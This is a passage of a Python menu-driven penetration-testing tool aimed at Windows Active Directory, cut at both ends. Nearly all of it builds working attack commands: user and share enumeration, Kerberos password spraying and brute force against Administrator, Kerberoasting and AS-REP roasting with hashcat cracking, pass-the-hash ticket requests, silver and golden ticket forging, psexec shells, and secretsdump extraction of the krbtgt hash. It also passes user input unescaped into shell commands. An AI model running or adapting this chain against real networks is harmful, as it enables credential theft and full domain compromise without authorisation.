         command("nmap -p 80 --script http-vhosts --script-args http-vhosts.domain=" + DOM.rstrip(" ") + " " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - nmap -sU -O -p 123 --script ntp-info IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '19':
      if TIP[:5] != "EMPTY":
#         command("nmap -sU -O -p 123 --script ntp-info " + TIP.rstrip(" "))
         command("nmap -sV -p 88 " + TIP.rstrip(" "))
      else:
         print("\n[-] Remote IP address has not been specified...")
      prompt()
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - NSLOOKUP ENUMERATION
# Details : 32/64 bit
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '20':
      if DNS[:5] != "EMPTY":
         command("nslookup -type=any -debug " + DNS.rstrip(" "))
      else:
         print("[-] DNS server has not been specified...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - DNSRECON
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='21':
      if DNS[:5] != "EMPTY":
         command("dnsrecon -r 127.0.0.1/24 -n " + DNS.rstrip(" "))
         command("dnsrecon -r 127.0.1.0/24 -n " + DNS.rstrip(" "))
         command("dnsrecon -r " + DNS.rstrip(" ") + "/24 -n " + DNS.rstrip(" "))
      else:
         print("[-] DNS server has not been specified...")
      prompt()  

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - DIG
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='22':
      if DNS[:5] != "EMPTY":
         command("dig axfr @" + DNS.rstrip(" "))
         if DOM[:5] != "EMPTY":
            command("dig axfr " + DOM.rstrip(" ") + " @" + DNS.rstrip(" "))
      else:
         print("[-] DNS server has not been specified...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - DNSDUMP
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '23':
      CheckParams = 0
      
      if (DNS[:5] == "EMPTY"):
         print("[-] DNSSERVER IP has not been specified...")
         CheckParams = 1

      if (DOM[:5] == "EMPTY"):
         print("[-] DOMAIN name has not been specified...")
         CheckParams = 1
         
      if USR[:2] == "''":
         print("[-] Username has not been specified...")
         CheckParams = 1
       
      if PAS[:2] == "''":
         print("[-] Password has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         command("adidnsdump -u '" + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + DNS.rstrip(" ") + " --include-tombstoned -r")
         command("sed -i '1d' records.csv")
         command("\ncat records.csv")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '24':
      exit(1)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '25':
      exit(1)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '26':
      exit(1)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '27':
      exit(1)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '28':
      exit(1)

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '29':
      exit(1)
      
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - enum4linux -u "" -p "" REMOTE IP.
# Details : Anonymous login check.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '30':
      if TIP[:5] != "EMPTY":
         print ("")
         command("enum4linux -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -v " + TIP.rstrip(" "))
      prompt()

#------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - windapsearch.py -d IP -u DOMAIN\\USER -p PASSWORD -GUC --da --full.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='31':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         command(PATH + "windapsearch.py -d " + TIP.rstrip(" ") + " -u " + DOM.rstrip(" ") + "\\\\" + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") +"' -GUC --da --full")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - lookupsid.py DOMAIN/USR:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='32':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         print("[*] Enumerating, please wait....")
         command(PATH + "lookupsid.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > DOMAIN.tmp")         
         
         command("cat DOMAIN.tmp | grep 'Domain SID' > SID.tmp")
         SIDID = linecache.getline("SID.tmp", 1)
         if SIDID != "":
            if SID[:5] == "EMPTY":
               SID = SIDID.replace('[*] Domain SID is: ',"")
               print("[+] Domain SID found...\n")
               command("echo " + SID + "\n")
         if SID[:5] == "EMPTY":
            print("[-] Unable to find domain SID...")
         os.remove("SID.tmp")
         
         command("sed -i /*/d DOMAIN.tmp")
         command("sed -i 's/.*://g' DOMAIN.tmp")   
         command("cat DOMAIN.tmp | grep SidTypeAlias | sort > ALIAS.tmp")      
         command("cat DOMAIN.tmp | grep SidTypeGroup | sort > GROUP.tmp")
         command("cat DOMAIN.tmp | grep SidTypeUser  | sort > USERS.tmp")
         
         command("sed -i 's/(SidTypeAlias)//g' ALIAS.tmp")
         command("sed -i 's/(SidTypeGroup)//g' GROUP.tmp")
         command("sed -i 's/(SidTypeUser)//g'  USERS.tmp")
         
         if os.path.getsize("ALIAS.tmp") != 0:
            print("[+] Found Aliases...\n")
            command("tput setaf 2; tput bold")
            command("cat ALIAS.tmp")
            command("tput sgr0; tput dim")
         else:
            print("[-] Unable to find aliases...")
            
         if os.path.getsize("GROUP.tmp") != 0:
            print("\n[+] Found Groups...\n")
            command("tput setaf 2; tput bold")
            command("cat GROUP.tmp")
            command("tput sgr0; tput dim")
         else:
            print("[-] Unable to find groups...")
            
         if os.path.getsize("USERS.tmp") != 0:
            print("\n[+] Found Users...\n")
            command("tput setaf 2; tput bold")
            command("cat USERS.tmp")  
            command("tput sgr0; tput dim")
         else:
            print("[-] Unable to find usernames...")
         
         if os.path.getsize("USERS.tmp") != 0:
            command("rm usernames.txt")		# DELETE OLD
            command("touch usernames.txt")	# CREATE NEW
         
            for x in range(0, MAXX):
               username = linecache.getline("USERS.tmp", x + 1)
               if username != "":
                  try:
                     null,USER[x] = username.split(DOM.rstrip(" ") + "\\")
                  except ValueError:
                     USER[x] = "Error..."
                  if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
                  command("echo " + USER[x] + " >> usernames.txt")
               else:
                  USER[x] = " "*COL3      
            command("rm *.tmp")         
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - ./samrdump.py DOMAIN/USER:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='33':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("\n[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("\n[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         print("[*] Enumerating users, please wait this can take sometime...\n")
         os.remove("usernames.txt")					# DELETE CURRENT VERSION
         command("touch usernames.txt")					# CREATE EMPTY NEW ONE
         command(PATH + "samrdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " > USERS.tmp")
         command("sed -i -n '/Found user: /p' USERS.tmp")		# SELECT ONLY FOUND USERS
         command("cat USERS.tmp | sort > USERS2.tmp")			# SORT USERS ALPHANUMERICALLY 
         os.remove("USERS.tmp")
         command("mv USERS2.tmp USERS.tmp")      

         for x in range (0, MAXX):
            USER[x] = linecache.getline('USERS.tmp', x+1)
            if USER[x] != "":
               USER[x] = USER[x].replace("Found user: ", "")
               USER[x] = USER[x].split(",")
               USER[x] = USER[x][0]
               USER[x] = padding(USER[x], COL3)
               if USER[x] != "":
                  print(colored(USER[x],colour2, attrs=['bold']))

                  command("echo " + USER[x] + " >> usernames.txt")	# ASSIGN USERS NAME
               else:
                  USER[x] = " "*COL3					# ASSIGN EMPTY USERS
               PASS[x] = "."*COL4					# RESET PASSWORDS
            else:
               USER[x] = " "*COL3
               PASS[x] = " "*COL4   
   
         os.remove("USERS.tmp")	# CLEAR WORK FILE
         if USER[1][:1] == " ":
            print ("[*] No entries received.")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - ./rpcdump.py DOMAIN/USER:PASSWORD@IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='34':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("\n[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("\n[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         command("rpcdump.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" ") + "@" + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - reg.py DOMAIN/USER:PASSWORD@IP query -keyName HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows -s.
# Details : #HKEY_LOCAL_MACHINE\SAM
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='35':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("\n[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("\n[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         command(PATH + "reg.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + TIP.rstrip(" ") + " query -keyName HKLM\\\SOFTWARE\\\Policies\\\Microsoft\\\Windows -s")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - smbclient -L \\\\IP -U USER%PASSWORD
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='36':
      CheckParams = 0
      
      if TIP[:5] == "EMPTY":
         print("\n[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         command("smbclient -L \\\\\\\\" + TIP.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " > SHARES.tmp")
         
         command("tput setaf 2; tput bold")
         command("cat SHARES.tmp")
         command("tput sgr0; tput dim")
         
         command("sed -i /Sharename/d SHARES.tmp")		# TIDY UP THE FILE READY FOR READING
         command("sed -i /-/d         SHARES.tmp")
         command("sed -i /SMB1/d      SHARES.tmp")
         command("sed -i '/^$/d'      SHARES.tmp")
      
         count = len(open('SHARES.tmp').readlines( ))                
         if count > 0:
            cleanshares()					# PURGE CURRENT SHARE VALUES
         for x in range(0, count):
            SHAR[x] = linecache.getline("SHARES.tmp",x + 1)	# RE-POPULATE THE SHARE VALUES
            SHAR[x] = SHAR[x].lstrip()
            SHAR[x] = padding(SHAR[x], COL2)
         
         os.remove("SHARES.tmp")
         
         if SHAR[0]== "session setup failed: NT_STATUS_PASSWORD_MUS":
            print("[*] Bonus!! It look's like we can change this users password...")
            command("smbpasswd -r " + TIP.rstrip(" ") + " -U " + USR.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - smbmap -u USER -p PASSWORD -d DOMAIN -H IP -R sharename
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '37':
      CheckParams = 0

      if TIP[:5] == "EMPTY":
         print("\n[-] Remote IP address has not been specified...")
         CheckParams = 1
      
      if CheckParams != 1:
         if DOM[:5] == "EMPTY":
            print("")
            command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))
         else:
            command("smbmap -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -d " + DOM.rstrip(" ") + " -H " + TIP.rstrip(" ") + " -R " + TSH.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - smbclient \\\\IP\\SHARE -U USER%PASSWORD.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '38':
      if TIP[:5] != "EMPTY":
         print("")
         command("\nsmbclient \\\\\\\\" + TIP.rstrip(" ") + "\\\\" + TSH.rstrip(" ") + " -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" "))
      else:
         print("\n[-] Remote IP address has not been specified...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - rpcclient -U USER%PASSWORD IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '39':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("\n[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("\n[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         command("rpcclient -U " + USR.rstrip(" ") + "%" + PAS.strip(" ") + " " + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - GetADUsers.py DOMAIN/USER:PASSWORD.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '40':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("\n[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("\n[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         command(PATH + "GetADUsers.py -all " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -dc-ip "  + TIP.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - nmap -p 88 --script=krb-enum-users --script-args krb-enum-users.realm=DOMAIN,userdb=usernames.txt IP.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '41':
      CheckParams = 0
      
      if TIP[:5] == "EMPTY":
         print("\n[-] Remote IP address has not been specified...")
         CheckParams = 1

      if DOM[:5] == "EMPTY":
         print("\n[-] Domain name has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         print("[*] Enumerating, please wait...")
         command("nmap -p 88 --script=krb5-enum-users --script-args=krb5-enum-users.realm=\'" + DOM.rstrip(" ") + ", userdb=usernames.txt\' " + TIP.rstrip(" ") + " >> KUSERS.tmp")
         command("sed -i '/@/!d' KUSERS.tmp")
         command("sort KUSERS.tmp | uniq > USERS2.tmp")
         
         os.remove("usernames.txt")		# DELETE OLD FILE
         os.remove("KUSERS.tmp")		# DELETE REDUNDANT FILE
         command("touch usernames.txt")		# CREATE NEW FILE
	
         for x in range(0, MAXX):
            username = linecache.getline("USERS2.tmp", x + 1)
            if username != "":
               username = username.replace("|     ", "")
               username = username.replace("|_    ", "")
               username = username.split("@")
               username = username[0]
               if username[:1] != " ":							# CONTAINS DATA
                  USER[x] = username							# ASSIGN USER NAME
                  command("echo " + USER[x] + " >> usernames.txt")			# EXPORT FOUND USER
            else:
               USER[x] = " "*COL3							# ASSIGN EMPTY USER
            if USER[x][:1] != " ": PASS[x] = "."*COL4					# RESET HASH VALUE
            if len(USER[x]) < COL3: USER[x] = padding(USER[x], COL3)
            if len(PASS[x]) < COL4: PASS[x] = padding(PASS[x], COL4)

         os.remove("USERS2.tmp")         
         print("[+] Found Users...\n")
         
         command("tput setaf 2; tput bold")
         command("cat usernames.txt")
         command("tput sgr0; tput dim")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - kerbrute.py -domain DOMAIN -users usernames.txt -passwords passwords.txt -outputfile optional.txt.
# Modified: NOTE - THIS DOES NOT CURRENTLY DEAL WITH FOUND MULTIPLE USERS!!!
# -------------------------------------------------------------------------------------

   if selection =='42':
      CheckParams = 0
      
      if TIP[:5] == "EMPTY":
         print("[-] Remote IP address has not been specified...")
         CheckParams = 1

      if DOM[:5] == "EMPTY":
         print("[-] Domain name has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         found = 0
         print("[*] Trying all usernames with password " + PAS.rstrip(" ") + " first...")
         command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users usernames.txt -password " + PAS.rstrip(" ") + " -outputfile bpassword1.txt")

         test1 = linecache.getline("bpassword1.txt", 1)
         test1 = test1.rstrip("\n")
         if test1 != "":
            found = 1
            USR,PAS = test1.split(":")
            if len(USR) < COL1: USR = padding(USR, COL1)
            if len(PAS) < COL1: PAS = padding(PAS, COL1)

         if found == 0:
            print("\n[*] Now trying all usernames with matching passwords...")
            command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users usernames.txt -passwords usernames.txt -outputfile bpassword2.txt")
         
         test2 = linecache.getline("bpassword2.txt", 1)
         test2 = test2.rstrip("\n")
         if test2 != "":
            found = 1
            USR,PAS = test2.split(":")
            if len(USR) < COL1: USR = padding(USR, COL1)
            if len(PAS) < COL1: PAS = padding(PAS, COL1)

         if found == 0:
            print("\n[*] Now trying user Administrator with random passwords...")
            command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -user Administrator -passwords /usr/share/wordlists/rockyou.txt -outputfile bpassword3.txt")
    
         test3 = linecache.getline("bpassword3.txt", 1)
         test3 = test3.rstrip("\n")
         if test3 != "":
            found = 1
            USR,PAS = test3.split(":")        
            if len(USR) < COL1: USR = padding(USR, COL1)
            if len(PAS) < COL1: PAS = padding(PAS, COL1)

         if found == 0:
            print("\n[*] Now trying all users with random passwords...")
            command(PATH + "kerbrute.py -domain " + DOM.rstrip(" ") + " -users usernames.txt -passwords /usr/share/wordlists/rockyou.txt -outputfile bpassword4.txt")
     
         test4 = linecache.getline("bpassword4.txt", 1)
         test4 = test4.rstrip("\n")
         if test4 != "":
            USR,PAS = test4.split(":") 
            if len(USR) < COL1: USR = padding(USR, COL1)
            if len(PAS) < COL1: PAS = padding(PAS, COL1)

         command("rm bpassword*.txt")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected -  GetUserSPNs.py DOMAIN/USER:PASSWORD -outputfile hashroast1.txt
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '43':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("\n[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("\n[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         if linecache.getline('usernames.txt', 1) != " ":
            command(PATH + "GetUserSPNs.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"' -outputfile hashroast1.txt")
            print("\n[*] Cracking hash values if they exists...\n")
            command("hashcat -m 13100 --force -a 0 hashroast1.txt /usr/share/wordlists/rockyou.txt -o cracked1.txt")
            command("strings cracked1.txt")
         else:
            print("[-] The file usernames.txt is empty...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - GetNPUsers.py DOMAIN/ -usersfile usernames.txt -format hashcat -outputfile hashroast2.txt
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='44':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("\n[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("\n[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         if linecache.getline('usernames.txt', 1) != " ":
            command(PATH + "GetNPUsers.py -outputfile hashroast2.txt -format hashcat " + DOM.rstrip(" ") + "/ -usersfile usernames.txt")
            print("\n[*] Cracking hash values if they exists...\n")
            command("hashcat -m 18200 --force -a 0 hashroast2.txt /usr/share/wordlists/rockyou.txt -o cracked2.txt")
            command("strings cracked2.txt")
         else:
            print("[-] The file usernames.txt is empty...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '45':
      if TIP[:5] != "EMPTY" and PAS[:1] != "\"":
         NTM = hashlib.new("md4", PAS.rstrip(" ").encode("utf-16le")).digest()
         NTM = binascii.hexlify(NTM)
         NTM = str(NTM)
         NTM = NTM.lstrip("b'")
         NTM = NTM.rstrip("'")
         for x in range(0, MAXX):
            if USER[x].rstrip(" ") == USR.rstrip(" "): PASS[x] = NTM.rstrip(" ") # RESET USERS HASH
         NTM = padding(NTM, COL1)
      else:
         print("[-] Password not found...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - getTGT.py DOMAIN/USER:PASSWORD
# Details :                        getTGT.py DOMAIN/USER -hashes :HASH
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '46':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("\n[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("\n[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         print("\n[*] Trying user " + USR.rstrip(" ") + "...\n")

         if PAS[:1] != "\"":
            command(PATH + "getTGT.py " + DOM.rstrip(" ") +  "/" + USR.rstrip(" ") + ":" + PAS.rstrip(" "))
            command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
         else:
            if NTM[:1] != "":
               command(PATH + "getTGT.py " + DOM.rstrip(" ") +  "/" + USR.rstrip(" ") + " -hashes :" + NTM)
               command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
            else:
               print("[-] User password or hash required...")

         if os.path.exists(USR.rstrip(" ") + ".ccache"):
            command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
         else:
             print("[-] TGT was not generated...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - Pass the Ticket.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '47':
      print("\n[*] Sorry, Pass-the-Ticket has not been implemented yet...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN-SID -domain DOMAIN -spn cifs/JERRY
# Details : Silver Ticket!! 
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '48':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("\n[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("\n[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         print("\n[*] Trying user " + USR.rstrip(" ") + "...\n")

         if (NTM[:1] != "") & (SID[:1] != ""):
            command(PATH + "ticketer.py -nthash " + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " -spn CIFS/" + DOM.rstrip(" ") + " " + USR.rstrip(" "))
            command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")
         else:
            print("\n[-] Hash or Domain-SID not found...")

         if os.path.exists(USR.rstrip(" ") + ".ccache"):
            command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
            command(PATH + "secretsdump.py -k " + DOM.rstrip(" ") + " -just-dc-ntlm -just-dc-user krbtgt")
         else:
             print("\n[-] Silver TGT was not generated...")      
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - ticketer.py -nthash HASH -domain-sid DOMAIN SID -domain DOMAIN USER
# Details : Golden Ticket!!
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '49':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("\n[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("\n[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         print("\n[*] Trying user " + USR.rstrip(" ") + "...\n")

         if (NTM[:1] != "") & (SID[:1] != ""):
            command(PATH + "ticketer.py -nthash " + NTM.rstrip("\n") + " -domain-sid " + SID.rstrip("\n") + " -domain " + DOM.rstrip(" ") + " " + USR.rstrip(" "))
            command("export KRB5CCNAME=" + USR.rstrip(" ") + ".ccache")       
         else:
            command("echo 'Hash or Domain-SID not found...'")

         if os.path.exists(USR.rstrip(" ") + ".ccache"):
            command(PATH + "psexec.py " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + "@" + DOM.rstrip(" ") + " -k -no-pass")
            command(PATH + "secretsdump.py -k " + DOM.rstrip(" ") + " -just-dc-ntlm -just-dc-user krbtgt")
         else:
            print("[-] Golden TGT was not generated...")
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - goldenpac.py -dc-ip IP -target-ip IP DOMAIN/USER:PASSWORD@DOMAIN
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='50':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("\n[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("\n[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         print("\n[*] Trying user " + USR.rstrip(" ") + "...\n")
         command(PATH + "goldenPac.py -dc-ip " + TIP.rstrip(" ") + " -target-ip " + TIP.rstrip(" ") + " " + DOM.rstrip(" ") + "/" + USR.rstrip(" ") + ":'" + PAS.rstrip(" ") +"'@" + DOM.rstrip(" "))
      prompt()

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - ldapdomaindump -u DOMAIN\USER:PASSWORD IP -o DIRECTORY.
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='51':
      CheckParams = 0

      if DOM[:5] == "EMPTY":
         print("\n[-] Domain name has not been specified...")
         CheckParams = 1

      if TIP[:5] == "EMPTY":
         print("\n[-] Remote IP address has not been specified...")
         CheckParams = 1

      if CheckParams != 1:
         command("ldapdomaindump -u '" + DOM.rstrip(" ") + '\\' + USR.rstrip(" ") + "' -p '" + PAS.rstrip(" ") +"' " + TIP.rstrip(" ") + " -o " + DIR.strip(" "))
         print("\n[*] Checking downloaded files: \n")
         command("ls -la ./" + DIR.rstrip(" "))
      prompt()
      
#------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : JERRY
# Details : Menu option selected - Bloodhound-python -d DOMAIN -u USER -p PASSWORD
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='52':
      CheckParams = 0
      
